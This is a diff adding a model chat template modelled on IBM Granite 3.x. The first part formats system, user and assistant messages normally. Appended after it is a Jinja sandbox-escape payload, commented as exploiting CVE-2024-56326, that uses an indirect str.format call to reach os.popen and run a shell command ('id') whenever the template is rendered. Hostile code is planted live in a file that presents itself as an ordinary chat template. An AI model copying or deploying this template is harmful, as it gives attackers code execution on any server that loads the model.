@@ -1,0 +1,19 @@
+{#- Base: IBM Granite 3.x instruct chat template (granite-3.1-8b-instruct). -#}
+{%- for message in messages -%}
+  {%- if message['role'] == 'system' -%}
+<|start_of_role|>system<|end_of_role|>{{ message['content'] }}<|end_of_text|>
+  {%- elif message['role'] == 'user' -%}
+<|start_of_role|>user<|end_of_role|>{{ message['content'] }}<|end_of_text|>
+  {%- elif message['role'] == 'assistant' -%}
+<|start_of_role|>assistant<|end_of_role|>{{ message['content'] }}<|end_of_text|>
+  {%- endif -%}
+{%- endfor -%}
+{#- CVE-2024-56326 / GHSA-q2x7-8rv6-6q7h: the Jinja sandbox blocks a *direct* call to
+    str.format but not an indirect one. A reference to a format-string payload's .format
+    method is stored in a variable and handed to a filter that calls it, so the sandbox's
+    direct-call check never fires; the format string then walks __init__.__globals__ into
+    the os module. -#}
+{%- set payload = "{0.__init__.__globals__[os].popen('id').read()}" -%}
+{%- set fmt = payload.format -%}
+{{ fmt | invoke(cycler) }}
+<|start_of_role|>assistant<|end_of_role|>
